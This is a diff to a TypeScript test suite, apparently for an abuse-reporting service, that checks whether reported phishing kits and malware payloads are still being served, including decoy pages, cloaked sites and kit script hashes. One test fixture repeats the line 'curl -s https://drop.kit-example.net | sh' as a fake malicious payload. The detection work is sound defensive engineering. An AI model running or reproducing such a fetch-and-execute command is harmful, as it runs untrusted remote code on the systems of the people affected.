@@ -81,13 +81,20 @@ const resource = (path: string, body: string): WebsiteKitResource => ({ url: `ht
  * its MHTML stored as the analysis stores them when `captured`), and its
  * report with one target.
  */
-async function reported(options: { rawPage?: string; renderedPage?: string; kitResources?: WebsiteKitResource[]; payload?: { url: string; sha256: string }; userAgent?: string; noCase?: boolean } = {}) {
+async function reported(options: { rawPage?: string; renderedPage?: string; decoyFirst?: string; kitResources?: WebsiteKitResource[]; payload?: { url: string; sha256: string }; userAgent?: string; noCase?: boolean } = {}) {
 	const submissionId = generateId();
-	const hops = [{ index: 0, url: URL_, hostname: HOST, status: 200, contentCaptured: true, bodyCaptured: options.rawPage !== undefined }];
+	// With `decoyFirst`, the walk first got a decoy on the same site and passed it (hop 0), then the kit (hop 1), which the case judged.
+	const judged = options.decoyFirst === undefined ? 0 : 1;
+	const hops = [
+		...(options.decoyFirst === undefined ? [] : [{ index: 0, url: `https://${HOST}/`, hostname: HOST, status: 200, contentCaptured: false, bodyCaptured: true, redirectTo: URL_ }]),
+		{ index: judged, url: URL_, hostname: HOST, status: 200, contentCaptured: true, bodyCaptured: options.rawPage !== undefined },
+	];
+	const siteAssessments = [{ finding: "phishing", phishingBasis: "credential_form", hopIndex: judged, judgedHopIndex: judged }] as never;
 	if (!options.noCase) {
-		await SubmissionsEntity.create({ id: submissionId, kind: "website", dedupeKey: `content-${submissionId}`, status: "reported", data: { kind: "website", website: { url: URL_, routes: [{ hops }], ...(options.kitResources ? { kitResources: options.kitResources } : {}) } } });
-		if (options.rawPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "chain-hop-0.html", kind: "website_hop_body", buffer: Buffer.from(options.rawPage) });
-		if (options.renderedPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "website.mhtml", kind: "website_mhtml", buffer: kitCapture(HOST, "1", { body: options.renderedPage }) });
+		await SubmissionsEntity.create({ id: submissionId, kind: "website", dedupeKey: `content-${submissionId}`, status: "reported", data: { kind: "website", website: { url: URL_, routes: [{ hops, siteAssessments }], ...(options.kitResources ? { kitResources: options.kitResources } : {}) } } });
+		if (options.decoyFirst !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "chain-hop-0.html", kind: "website_hop_body", buffer: Buffer.from(options.decoyFirst) });
+		if (options.rawPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: `chain-hop-${judged}.html`, kind: "website_hop_body", buffer: Buffer.from(options.rawPage) });
+		if (options.renderedPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: judged ? "website-step2.mhtml" : "website.mhtml", kind: "website_mhtml", buffer: kitCapture(HOST, "1", { body: options.renderedPage }) });
 	}
 	const request = await validateAbuseReportRequest({ targets: [HOST], allegationCategory: options.payload ? "malware" : "phishing", description: "Credential phishing page.", observedUrls: [{ target: HOST, urls: [options.payload?.url ?? URL_] }] });
 	const report = await AbuseRepository.createReport({
@@ -144,30 +151,65 @@ describe("verifying that the reported content is still served", () => {
 		expect(same.verdict === "served" && same.matches.map((match) => match.kind).sort()).toEqual(["page_body", "page_structure"]);
 	});
 
-	test("the kit's own script, byte for byte on the site's host, proves it while the page answers; a library script or a removed page does not", async () => {
+	test("a decoy the walk passed on the same site is no evidence: the reference is the page the case judged", async () => {
+		const { target } = await reported({ rawPage: kitPage(HOST), decoyFirst: DECOY });
+		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
+		// The site now shows everyone the decoy: a plain request gets it and proves nothing.
+		const verification = await verifyReportedContent(target, { maxTier: "browser" }, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
+		expect(verification).toMatchObject({ verdict: "unverified", tier: "browser" });
+		expect(used.captures).toBe(1);
+		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "x") } }).dependencies, ...browser })).toMatchObject({ verdict: "served", tier: "fetch" });
+	});
+
+	test("the kit's own script is evidence beside a matching page; alone, a plain request cannot tell it from a file left behind", async () => {
 		const kit = resource("/assets/kit.js", KIT_JS);
 		const library = resource("/assets/jquery.min.js", LIBRARY_JS);
-		const { target } = await reported({ kitResources: [kit, library] });
-		const page = "<html><body>loading…</body></html>";
-		const online = site({ [URL_]: { body: page }, [kit.url]: { body: KIT_JS, type: "application/javascript" }, [library.url]: { body: LIBRARY_JS, type: "application/javascript" } });
-		const { used, dependencies: browser } = stages(() => new WebsiteCaptureFailedError([new WebsiteUnreachableError("residential", "net::ERR_CONNECTION_RESET")]));
-		const verification = await verifyReportedContent(target, {}, { site: online.dependencies, ...browser });
-		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "kit_file", sha256: kit.sha256, url: kit.url }] });
+		const { target } = await reported({ rawPage: kitPage(HOST), kitResources: [kit, library] });
+		const files = { [kit.url]: { body: KIT_JS, type: "application/javascript" }, [library.url]: { body: LIBRARY_JS, type: "application/javascript" } };
+		const failing = stages(() => new WebsiteCaptureFailedError([new WebsiteUnreachableError("residential", "net::ERR_CONNECTION_RESET")]));
+		const online = site({ [URL_]: { body: kitPage(HOST, "n2") }, ...files });
+		const verification = await verifyReportedContent(target, {}, { site: online.dependencies, ...failing.dependencies });
+		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "page_structure" }, { kind: "kit_file", sha256: kit.sha256, url: kit.url }] });
+		// A library is never fetched as proof.
 		expect(online.requested).not.toContain(library.url);
-		expect(used.captures).toBe(0);
+		expect(failing.used.captures).toBe(0);
 
-		// The page is removed while its script stays behind: a plain request proves nothing, so the browser looks.
-		const removed = site({ [URL_]: { status: 404, body: "Not Found" }, [kit.url]: { body: KIT_JS, type: "application/javascript" } });
-		const after = await verifyReportedContent(target, {}, { site: removed.dependencies, ...browser });
-		expect(after).toMatchObject({ verdict: "unverified", tier: "browser", state: "removed" });
+		// The page was replaced while its script stays behind: the browser must see a page that loads it.
+		const replaced = site({ [URL_]: { body: DECOY }, ...files });
+		const after = await verifyReportedContent(target, {}, { site: replaced.dependencies, ...failing.dependencies });
+		expect(after).toMatchObject({ verdict: "unverified", tier: "browser", state: "online" });
 		expect(after.verdict === "unverified" && after.reason).toContain("ERR_CONNECTION_RESET");
-		expect(removed.requested).not.toContain(kit.url);
+		expect(replaced.requested).not.toContain(kit.url);
+		// A loader page that loads the kit's script in the browser is the kit, and is learned as its page.
+		const loader = `<html><body>${templatePage(5, () => "loading", () => "l")}<script src="/assets/kit.js"></script></body></html>`;
+		const loading = stages((url) => capture(url, loader, { kitResources: [kit] }));
+		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: loader }, ...files }).dependencies, ...loading.dependencies })).toMatchObject({ verdict: "served", tier: "browser", matches: [{ kind: "kit_file", url: kit.url }] });
+		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: loader }, ...files }).dependencies, ...loading.dependencies })).toMatchObject({ verdict: "served", tier: "fetch" });
+		expect(loading.used.captures).toBe(1);
+	});
+
+	test("without a page or kit file recorded, the browser is not started for nothing", async () => {
+		const { target } = await reported();
+		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
+		expect(await verifyReportedContent(target, { maxTier: "browser" }, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser })).toMatchObject({ verdict: "unverified", tier: "fetch", reason: "The case recorded no page or kit file to compare with." });
+		expect(used.captures).toBe(0);
+	});
+
+	test("a check the caller already made is used, not repeated", async () => {
+		const { target } = await reported({ rawPage: kitPage(HOST) });
+		const { requested, dependencies } = site({ [URL_]: { body: kitPage(HOST) } });
+		const { checkSite } = await import("./check");
+		const check = await checkSite(URL_, dependencies);
+		requested.length = 0;
+		expect(await verifyReportedContent(target, {}, { site: dependencies, check, ...stages().dependencies })).toMatchObject({ verdict: "served", tier: "fetch" });
+		expect(requested).toEqual([]);
 	});
 
 	test("a payload is fetched as the downloader the report names gets it, and matches only byte for byte", async () => {
 		const payloadUrl = `https://${HOST}/wksxgj/loader`;
 		const bytes = Buffer.from(`#!/bin/zsh\n${"curl -s https://drop.kit-example.net | sh\n".repeat(30)}`);
-		const { target } = await reported({ payload: { url: payloadUrl, sha256: sha256Hex(bytes) }, userAgent: "curl/8.7.1", noCase: true });
+		// The original request may carry the hash in capitals.
+		const { target } = await reported({ payload: { url: payloadUrl, sha256: sha256Hex(bytes).toUpperCase() }, userAgent: "curl/8.7.1", noCase: true });
 		const onlyCurl: Answer = (headers) => (headers.get("user-agent")?.startsWith("curl/") ? { body: bytes, type: "application/octet-stream" } : { status: 404, body: "Not Found" });
 		const { used, dependencies: browser } = stages();
 		const served = await verifyReportedContent(target, {}, { site: site({ [payloadUrl]: onlyCurl }).dependencies, ...browser });
@@ -178,6 +220,9 @@ describe("verifying that the reported content is still served", () => {
 
 		const swapped = await verifyReportedContent(target, { maxTier: "fetch" }, { site: site({ [payloadUrl]: { body: Buffer.from("echo other build"), type: "application/octet-stream" } }).dependencies, ...browser });
 		expect(swapped).toMatchObject({ verdict: "unverified", tier: "fetch" });
+		// A partial or oversized answer is not the file.
+		const partial = await verifyReportedContent(target, { maxTier: "fetch" }, { site: site({ [payloadUrl]: { status: 206, body: bytes, type: "application/octet-stream" } }).dependencies, ...browser });
+		expect(partial.verdict).toBe("unverified");
 	});
 
 	test("a cloaked site is confirmed by the browser, and the page it got is learned: the next plain request that gets it needs no browser", async () => {
@@ -207,7 +252,8 @@ describe("verifying that the reported content is still served", () => {
 	test("the kit's scripts from any host count in the browser, by hash", async () => {
 		const backend = { url: "https://cdn.kit-backend.net/x/loader.js", mimeType: "application/javascript", size: Buffer.byteLength(KIT_JS), sha256: sha256Hex(KIT_JS) };
 		const { target } = await reported({ kitResources: [backend] });
-		const { dependencies: browser } = stages((url) => capture(url, "<p>changed wording</p>", { kitResources: [backend] }));
+		// The browser ends on another address of the site than the one reported.
+		const { dependencies: browser } = stages(() => capture(`${URL_}?step=2`, "<p>changed wording</p>", { kitResources: [backend] }));
 		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
 		expect(verification).toMatchObject({ verdict: "served", tier: "browser", matches: [{ kind: "kit_file", url: backend.url, sha256: backend.sha256 }] });
 	});
@@ -221,9 +267,10 @@ describe("verifying that the reported content is still served", () => {
 		expect(changed).toMatchObject({ verdict: "changed_malicious", tier: "analysis", finding: "phishing" });
 		expect(stillAbusive(changed)).toBe(true);
 		expect(phishing.used).toEqual({ captures: 1, classifications: 1 });
-		// The new version, once judged, is recognised by a plain request.
+		// A page the classifier judged is never learned as the reported one: it may be another kit, or a mistake.
 		const again = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: changedRaw } }).dependencies, ...phishing.dependencies });
-		expect(again).toMatchObject({ verdict: "served", tier: "fetch" });
+		expect(again).toMatchObject({ verdict: "changed_malicious", tier: "analysis" });
+		expect(phishing.used).toEqual({ captures: 2, classifications: 2 });
 
 		const benign = stages((url) => capture(url, DECOY), "insufficient_evidence");
 		const clean = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...benign.dependencies });
